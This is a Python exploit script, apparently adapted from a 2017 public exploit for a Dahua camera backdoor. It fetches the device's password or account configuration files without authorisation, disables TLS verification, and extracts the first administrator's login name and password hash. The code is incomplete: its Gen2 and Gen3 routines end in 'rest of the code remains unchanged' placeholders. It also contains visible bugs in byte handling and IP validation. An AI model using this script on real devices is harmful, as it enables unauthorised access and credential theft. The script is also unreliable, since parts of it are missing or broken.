import string
import sys
import socket
import argparse
import urllib.request
import urllib.parse
import base64
import ssl
import json
import commentjson  # pip install commentjson
import hashlib

class HTTPconnect:

    def __init__(self, host, proto, verbose, creds, Raw):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.Raw = Raw

    def Send(self, uri, query_headers, query_data, ID):
        self.uri = uri
        self.query_headers = query_headers
        self.query_data = query_data
        self.ID = ID

        # Connect-timeout in seconds
        timeout = 5
        socket.setdefaulttimeout(timeout)

        url = '{}://{}{}'.format(self.proto, self.host, self.uri)

        if self.verbose:
            print("[Verbose] Sending:", url)

        if self.proto == 'https':
            if hasattr(ssl, '_create_unverified_context'):
                print("[i] Creating SSL Unverified Context")
                ssl._create_default_https_context = ssl._create_unverified_context

        if self.credentials:
            Basic_Auth = self.credentials.split(':')
            if self.verbose:
                print("[Verbose] User:", Basic_Auth[0], "Password:", Basic_Auth[1])
            try:
                pwd_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
                auth_handler = urllib.request.HTTPBasicAuthHandler(pwd_mgr)
                opener = urllib.request.build_opener(auth_handler)
                urllib.request.install_opener(opener)
            except Exception as e:
                print("[!] Basic Auth Error:", e)
                sys.exit(1)

        if self.query_data:
            request = urllib.request.Request(url, data=json.dumps(self.query_data).encode('utf-8'), headers=self.query_headers)
        else:
            request = urllib.request.Request(url, None, headers=self.query_headers)
        response = urllib.request.urlopen(request)
        # print response
        if response:
            print("[<] {} OK".format(response.code))

        if self.Raw:
            return response
        else:
            html = response.read()
            return html


class Dahua_Backdoor:

    def __init__(self, rhost, proto, verbose, creds, Raw):
        self.rhost = rhost
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.Raw = Raw

    def Gen2(self, response, headers):
        self.response = response.read()
        self.headers = headers

        html = self.response.splitlines()
        if self.verbose:
            for lines in html:
                print("{}".format(lines))
        #
        # Check for first available admin user
        #
        for line in html:
            if line[0] == "#" or line[0] == "\n":
                continue
            line = line.split(':')[0:25]
            if line[3] == '1':  # Check if the user is in the admin group
                USER_NAME = line[1]  # Save login name
                PWDDB_HASH = line[2]  # Save hash
                print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0], line[1], line[2]))
                break

        # ... (rest of the code remains unchanged)

    def Gen3(self, response, headers):
        self.response = response.read()
        self.headers = headers

        json_string = ""
        start = False
        for x in self.response:
            if x[0] == '{' or start == True:
                start = True
                json_string = json_string + x
        json_obj = json.loads(json_string)

        # ... (rest of the code remains unchanged)


class Validate:

    def __init__(self, verbose):
        self.verbose = verbose

    def CheckIP(self, IP):
        self.IP = IP

        ip = self.IP.split('.')
        if len(ip) != 4:
            return False
        for tmp in ip:
            if not tmp.isdigit():
                return False
        i = int(tmp)
        if i < 0 or i > 255:
            return False
        return True

    def Port(self, PORT):
        self.PORT = PORT

        if int(self.PORT) < 1 or int(self.PORT) > 65535:
            return False
        else:
            return True

    def Host(self, HOST):
        self.HOST = HOST

        try:
            socket.inet_aton(self.HOST)
            if self.CheckIP(self.HOST):
                return self.HOST
            else:
                return False
        except socket.error as e:
            try:
                self.HOST = socket.gethostbyname(self.HOST)
                return self.HOST
            except socket.error as e:
                return False


if __name__ == '__main__':
    INFO = '[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\n'
    HTTP = "http"
    HTTPS = "https"
    proto = HTTP
    verbose = False
    raw_request = True
    rhost = '192.168.5.2'  # Default Remote HOST
    rport = '80'  # Default Remote PORT
    creds = False  # creds = 'user:pass'

    try:
        arg_parser = argparse.ArgumentParser(
            prog=sys.argv[0],
            description=('[*] ' + INFO + ' [*]'))
        arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: ' + rhost + ']')
        arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: ' + rport + ']')
        if creds:
            arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: ' + creds + ']')
        arg_parser.add_argument('--https', required=False, default=False, action='store_true',
                                help='Use HTTPS for remote connection [Default: HTTP]')
        arg_parser.add_argument('-v', '--verbose', required=False, default=False, action='store_true',
                                help='Verbose mode [Default: False]')
        args = arg_parser.parse_args()
    except Exception as e:
        print(INFO, "\nError: %s\n" % str(e))
        sys.exit(1)

    if len(sys.argv) == 1:
        arg_parser.parse_args(['-h'])

    print("\n[*]", INFO)

    if args.verbose:
        verbose = args.verbose

    if args.https:
        proto = HTTPS
        if not args.rport:
            rport = '443'

    if creds and args.auth:
        creds = args
    if args.rhost:
        rhost = args.rhost

    if not Validate(verbose).Port(rport):
        print("[!] Invalid RPORT - Choose between 1 and 65535")
        sys.exit(1)

    rhost = Validate(verbose).Host(rhost)
    if not rhost:
        print("[!] Invalid RHOST")
        sys.exit(1)

    if args.https:
        print("[i] HTTPS / SSL Mode Selected")
    print("[i] Remote target IP:", rhost)
    print("[i] Remote target PORT:", rport)

    rhost = rhost + ':' + rport

    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Request': 'JSON',
        'User-Agent': 'Dahua/2.0; Dahua/3.0'
    }

    try:
        print("[>] Checking for backdoor version")
        URI = "/current_config/passwd"
        response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
        print("[!] Generation 2 found")
        response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen2(response, headers)
        print(response)
    except urllib.request.HTTPError as e:
        if e.code == 404:
            try:
                URI = '/current_config/Account1'
                response = HTTPconnect(rhost, proto, verbose, creds, raw_request).Send(URI, headers, None, None)
                print("[!] Generation 3 Found")
                response = Dahua_Backdoor(rhost, proto, verbose, creds, raw_request).Gen3(response, headers)
            except urllib.request.HTTPError as e:
                if e.code == 404:
                    print("[!] Patched or not Dahua device! ({})".format(e.code))
                    sys.exit(1)
                else:
                    print("Error Code: {}".format(e.code))
    except Exception as e:
        print("[!] Detect of target failed ({})".format(e))
        sys.exit(1)

    print("\n[*] All done...\n")
    sys.exit(0)
